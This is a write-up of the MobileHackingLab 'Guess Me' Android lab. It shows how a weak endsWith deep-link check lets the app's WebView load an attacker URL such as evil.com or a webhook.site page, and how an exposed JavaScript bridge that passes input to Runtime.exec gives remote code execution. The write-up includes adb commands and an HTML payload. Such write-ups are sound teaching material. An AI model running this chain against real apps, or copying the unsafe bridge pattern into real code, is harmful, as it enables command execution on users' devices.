# MobileHackingLabs - GussMe

<figure><img src="./images/articles/android-security-mobilehackinglabs-gussme/01.png" alt=""><figcaption></figcaption></figure>

***

<https://www.mobilehackinglab.com/course/lab-guess-me>

Let’s see what this challenge is about originally.\
First thing we find is that there’s an APK for a number-guessing game, and we see that the game code is simple: you have 10 attempts to guess a number, and that number is random as shown in the code:

```java
    private final int maxAttempts = 10;  
    private int secretNumber;
```

Regarding `secretNumber`, as I explained, it’s a random value not stored in the code:

```java
this.secretNumber = Random.INSTANCE.nextInt(1, TypedValues.TYPE_TARGET);
```

The idea of the game is to guess the number inside `secretNumber` within 10 attempts:

```java
    private final void validateGuess() {  
        EditText editText = this.guessEditText;  
        if (editText == null) {  
            Intrinsics.throwUninitializedPropertyAccessException("guessEditText");  
            editText = null;  
        }  
        Integer userGuess = StringsKt.toIntOrNull(editText.getText().toString());  
        if (userGuess != null) {  
            this.attempts++;  
            if (userGuess.intValue() < this.secretNumber) {  
                displayMessage("Too low! Try again.");  
            } else if (userGuess.intValue() > this.secretNumber) {  
                displayMessage("Too high! Try again.");  
            } else {  
                displayMessage("Congratulations! You guessed the correct number " + this.secretNumber + " in " + this.attempts + " attempts.");  
                disableInput();  
            }  
            if (this.attempts == this.maxAttempts) {  
                displayMessage("Sorry, you've run out of attempts. The correct number was " + this.secretNumber + '.');  
                disableInput();  
                return;  
            }  
            return;  
        }  
        displayMessage("Please enter a valid number.");  
    }
```

But that’s not the main point of the challenge. The real goal is to dive into Android Components Attacks — specifically DeepLink and WebView — and how to combine them to reach RCE. It’s a very practical exercise. Let’s examine the challenge.

If we look at the `AndroidManifest.xml` we find that there is an activity for a WebView:

```xml
 <activity  
            android:name="com.mobilehackinglab.guessme.WebviewActivity"  
            android:exported="true">  
            <intent-filter>  
                <action android:name="android.intent.action.VIEW"/>  
                <category android:name="android.intent.category.DEFAULT"/>  
                <category android:name="android.intent.category.BROWSABLE"/>  
                <data  
                    android:scheme="mhl"  
                    android:host="mobilehackinglab"/>  
            </intent-filter>  
        </activity>
```

When we inspect its code we find two very important functions: `isValidDeepLink` and also `handleDeepLink`.

Let’s start and understand the `isValidDeepLink` method:

```java
    private final boolean isValidDeepLink(Uri uri) {  
        if ((!Intrinsics.areEqual(uri.getScheme(), "mhl") && !Intrinsics.areEqual(uri.getScheme(), "https")) || !Intrinsics.areEqual(uri.getHost(), "mobilehackinglab")) {  
            return false;  
        }  
        String queryParameter = uri.getQueryParameter("url");  
        return queryParameter != null && StringsKt.endsWith$default(queryParameter, "mobilehackinglab.com", false, 2, (Object) null);  
    }
```

We see that to display a WebView it checks three conditions and all three must be true:

1. The `scheme` must equal `mhl` or `https`.
2. The `host` must equal `mobilehackinglab`.
3. It takes the `url` query parameter and it must end with `mobilehackinglab.com`.

So the link must look like:

```
mhl://mobilehackinglab/?url=mobilehackinglab.com 
or
https://mobilehackinglab/?url=mobilehackinglab.com 
```

**Let me ask you:**

What method can we use to bypass that filter and load `evil.com`, for example? Think a bit.

**Thought about it?**

You’re right — the vulnerability is in the substring check:

```java
StringsKt.endsWith$default(queryParameter, "mobilehackinglab.com", false, 2, (Object) null); 
```

Because here it checks that the `url` **ends with** `mobilehackinglab.com`, but we can put anything before it. For example:

```
mhl://mobilehackinglab/?url=evil.com?mobilehackinglab.com
```

This bypasses the check and will redirect the victim to `evil.com`.

Now let’s see the second method `handleDeepLink`:

```java
    private final void handleDeepLink(Intent intent) {  
        Uri uri = intent != null ? intent.getData() : null;  
        if (uri != null) {  
            if (isValidDeepLink(uri)) {  
                loadDeepLink(uri);  
            } else {  
                loadAssetIndex();  
            }  
        }  
    }
```

This method is simple: if the URI exists and `isValidDeepLink(uri)` is true, it calls `loadDeepLink(uri)`. Otherwise it calls `loadAssetIndex()`.

```java
    private final void loadAssetIndex() {  
        WebView webView = this.webView;  
        if (webView == null) {  
            Intrinsics.throwUninitializedPropertyAccessException("webView");  
            webView = null;  
        }  
        webView.loadUrl("file:///android_asset/index.html");  
    }
```

That loads a prepared HTML page packaged inside the APK:

```html
<script>  
  
    function loadWebsite() {  
       window.location.href = "https://www.mobilehackinglab.com/";  
    }  

    var result = AndroidBridge.getTime("date");  
    var lines = result.split('\n');  
    var timeVisited = lines[0];  
    var fullMessage = "Thanks for playing the game\n\n Please visit mobilehackinglab.com for more! \n\nTime of visit: " + timeVisited;  
    document.getElementById('result').innerText = fullMessage;  
  
</script>
```

<figure><img src="./images/articles/android-security-mobilehackinglabs-gussme/02.png" alt=""><figcaption></figcaption></figure>

***

```java
webView3.addJavascriptInterface(new MyJavaScriptInterface(), "AndroidBridge");
```

This line connects an Android class (`MyJavaScriptInterface`) to the JavaScript inside the WebView under the name `AndroidBridge`, so JavaScript running in the page can call Android methods. This is used to get the time that will be shown on the screen when the site is visited.

* This feature lets the Java code (your Android code) talk to the JavaScript code (the code inside the page shown by the WebView).

### Let’s start the first WebView exploit

Since we managed to bypass the protection by crafting input that satisfies the code’s check while still executing the attacker’s desire (as we explained above):

```
https://mobilehackinglab?url=https://evil.com?test=mobilehackinglab.com
```

We can simulate this exploit via ADB with this command:

```shell
adb shell am start -n com.mobilehackinglab.guessme/.WebviewActivity -d https://mobilehackinglab?url=https://evil.com?test=mobilehackinglab.com
```

The command tells the Android device or emulator: open the `WebviewActivity` of the `com.mobilehackinglab.guessme` app and pass this URI as intent data.

* `adb shell`: open a shell on the Android device connected via adb.
* `am start`: use the Android Activity Manager to start an Activity.
* `-n com.mobilehackinglab.guessme/.WebviewActivity`: component to start (`packageName/.ActivityName`).
* `-d`: pass a data URI to the intent. Here the URI is:

```
https://mobilehackinglab?url=https://evil.com?test=mobilehackinglab.com
```

After running the command we see that we indeed bypassed the protection and can redirect the victim to `https://evil.com`.

<figure><img src="./images/articles/android-security-mobilehackinglabs-gussme/03.png" alt=""><figcaption></figcaption></figure>

***

### Reaching RCE by Combining Two Vulnerabilities

As we showed above, we found a vulnerability in the WebView by injecting a malicious site via DeepLink. But that alone is not sufficient to reach high impact. We can raise the impact by combining it with another issue, as we’ll now show.

```java
        WebSettings webSettings = webView.getSettings();  
        Intrinsics.checkNotNullExpressionValue(webSettings, "getSettings(...)");  
        webSettings.setJavaScriptEnabled(true);  
        WebView webView3 = this.webView;  
        if (webView3 == null) {  
            Intrinsics.throwUninitializedPropertyAccessException("webView");  
            webView3 = null;  
        }  
        webView3.addJavascriptInterface(new MyJavaScriptInterface(), "AndroidBridge");  
        WebView webView4 = this.webView;  
        if (webView4 == null) {  
            Intrinsics.throwUninitializedPropertyAccessException("webView");  
            webView4 = null;  
        }
```

Here we find two very important things: `addJavascriptInterface` and `setJavaScriptEnabled`.

* `setJavaScriptEnabled(true)` means JavaScript can run inside the WebView, which can lead to XSS if the input is attacker-controlled.
* `addJavascriptInterface` defines a new interface named `AndroidBridge`. This creates a bridge that allows JavaScript inside the WebView to call specific Java methods inside the application — and that is the big problem!!!

Because it allows JavaScript to call into Java code, and if the Java method executes system commands (or other unsafe actions), the attacker can achieve code execution.

If we look at how the Java code computes the time, we find it uses `exec` — literally, if we pass something other than a time command, e.g., `"whoami"`, it will execute on the system and we can get RCE:

```java
        @JavascriptInterface  
        public final String getTime(String Time) throws IOException {  
            Intrinsics.checkNotNullParameter(Time, "Time");  
            try {  
                Process process = Runtime.getRuntime().exec(Time); // Look!!!!!! 
                InputStream inputStream = process.getInputStream();  
                Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");  
                Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);  
                BufferedReader reader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);  
                String text = TextStreamsKt.readText(reader);  
                reader.close();  
                return text;  
            } catch (Exception e) {  
                return "Error getting time";  
            }  
        }
```

How can we craft an exploit that uses the JavaScript interface in our case?

Use:

```
javascript:AndroidBridge.getTime('whoami')
```

We prefix with `javascript:` then the bridge name — in our case `AndroidBridge` (as set by `webView3.addJavascriptInterface(new MyJavaScriptInterface(), "AndroidBridge");`) — and then call the method name we want (`getTime`) with a command string that will be executed.

We can host JavaScript code with our exploit on a server and call it via the DeepLink as we bypassed the filter earlier.

The exploit command is:

```shell
adb shell am start -n com.mobilehackinglab.guessme/.WebviewActivity -d https://mobilehackinglab?url=https://webhook.site/2a03f30b-0968-4072-8945-72cf3255aa7e?test=mobilehackinglab.com
```

<figure><img src="./images/articles/android-security-mobilehackinglabs-gussme/04.png" alt=""><figcaption></figcaption></figure>

The idea is that our server serves code that exploits the vulnerability, for example:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>

<h1>Hacked By everythingBlackkk</h1>
<h3>Command Result: </h3>

<p id="result">Thank you for visiting</p>

<script>

    var result = AndroidBridge.getTime("id");
    var lines = result.split('\n');
    var timeVisited = lines[0];
    document.getElementById('result').innerText = timeVisited;

</script>

</body>
</html>
```

Here we call `AndroidBridge.getTime("id")` instead of `getTime("time")`, so the Java code will run `id` (a shell command) instead of a harmless time command.

```js
 var result = AndroidBridge.getTime("id");
```

Thus we achieve RCE by combining the two vulnerabilities: the DeepLink filter bypass and the unsafe JavaScript interface. I hope I explained everything clearly in the article.

## Thank you all! I hope you enjoyed the article. If you have any questions, I’m here to help. 

### Remember My name : everythingBlackkk

Made by ❤

Github : <https://github.com/everythingBlackkk>

Linkedin : [www.linkedin.com/in/everythingblackkk](http://www.linkedin.com/in/everythingblackkk)

X : <https://x.com/0xblackkk>

Youtube : <https://www.youtube.com/@everythingBlackkk>
